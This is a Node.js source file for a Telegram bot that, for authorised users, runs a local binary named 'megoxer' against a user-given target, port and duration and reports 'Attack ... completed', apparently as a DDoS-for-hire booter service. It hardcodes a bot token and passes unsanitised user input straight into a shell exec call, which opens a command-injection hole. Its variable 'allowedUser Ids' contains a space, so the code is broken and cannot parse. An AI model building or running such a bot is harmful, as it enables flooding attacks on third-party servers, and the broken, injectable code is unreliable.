const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const { exec } = require('child_process');
const path = require('path');

// Insert your Telegram bot token here
const token = '7324603047:AAE5tXfan8-JWMBoIL4B9LlnddaUsi3F2Zg';
const bot = new TelegramBot(token, { polling: true });

// Admin user IDs
const adminIds = new Set(["1302320722"]);

// File paths
const USER_FILE = "users.txt";
const LOG_FILE = "log.txt";

// Read users from file
function readUsers() {
    if (fs.existsSync(USER_FILE)) {
        return fs.readFileSync(USER_FILE, 'utf8').split('\n').filter(Boolean);
    }
    return [];
}

let allowedUser Ids = readUsers();

// Log command to file
function logCommand(userId, target, port, time) {
    const username = `User ID: ${userId}`;
    const logEntry = `Username: ${username}\nTarget: ${target}\nPort: ${port}\nTime: ${time}\n\n`;
    fs.appendFileSync(LOG_FILE, logEntry);
}

// Clear logs
function clearLogs() {
    if (fs.existsSync(LOG_FILE)) {
        fs.truncateSync(LOG_FILE, 0);
        return "Logs cleared successfully.";
    }
    return "No logs found.";
}

// Command handlers
bot.onText(/\/add (.+)/, (msg, match) => {
    const userId = msg.chat.id.toString();
    if (adminIds.has(userId)) {
        const userToAdd = match[1];
        if (!allowedUser Ids.includes(userToAdd)) {
            allowedUser Ids.push(userToAdd);
            fs.appendFileSync(USER_FILE, `${userToAdd}\n`);
            bot.sendMessage(msg.chat.id, `User  ${userToAdd} added successfully.`);
        } else {
            bot.sendMessage(msg.chat.id, "User  already in bot.");
        }
    } else {
        bot.sendMessage(msg.chat.id, "Only for admin.");
    }
});

bot.onText(/\/remove (.+)/, (msg, match) => {
    const userId = msg.chat.id.toString();
    if (adminIds.has(userId)) {
        const userToRemove = match[1];
        if (allowedUser Ids.includes(userToRemove)) {
            allowedUser Ids = allowedUser Ids.filter(id => id !== userToRemove);
            fs.writeFileSync(USER_FILE, allowedUser Ids.join('\n'));
            bot.sendMessage(msg.chat.id, `User  ${userToRemove} removed successfully.`);
        } else {
            bot.sendMessage(msg.chat.id, `User  ${userToRemove} not found in list.`);
        }
    } else {
        bot.sendMessage(msg.chat.id, "Only for admin.");
    }
});

bot.onText(/\/clearlogs/, (msg) => {
    const userId = msg.chat.id.toString();
    if (adminIds.has(userId)) {
        const response = clearLogs();
        bot.sendMessage(msg.chat.id, response);
    } else {
        bot.sendMessage(msg.chat.id, "Only for admin.");
    }
});

bot.onText(/\/allusers/, (msg) => {
    const userId = msg.chat.id.toString();
    if (adminIds.has(userId)) {
        const users = readUsers();
        const response = users.length ? `Authorized Users:\n${users.join('\n')}` : "No data found.";
        bot.sendMessage(msg.chat.id, response);
    } else {
        bot.sendMessage(msg.chat.id, "Only for admin.");
    }
});

bot.onText(/\/id/, (msg) => {
    const userId = msg.chat.id;
    bot.sendMessage(msg.chat.id, `Your ID: ${userId}`);
});

// Start attack command
bot.onText(/\/aadi (.+) (.+) (.+)/, (msg, match) => {
    const userId = msg.chat.id.toString();
    const target = match[1];
    const port = match[2];
    const time = match[3];

    if (allowedUser Ids.includes(userId)) {
        const fullCommand = `./megoxer ${target} ${port} ${time} 900`;
        exec(fullCommand, (error, stdout, stderr) => {
            if (error) {
                bot.sendMessage(msg.chat.id, `Error: ${error.message}`);
                return;
            }
            if (stderr) {
                bot.sendMessage(msg.chat.id, `Stderr: ${stderr}`);
                return;
            }
            logCommand(userId, target, port, time);
            bot.sendMessage(msg.chat.id, `Attack on ${target}:${port} completed successfully.`);
        });
    } else {
        bot.sendMessage(msg.chat.id, "You are not authorized.");
    }
});

// Start the bot
console.log('Bot is running...');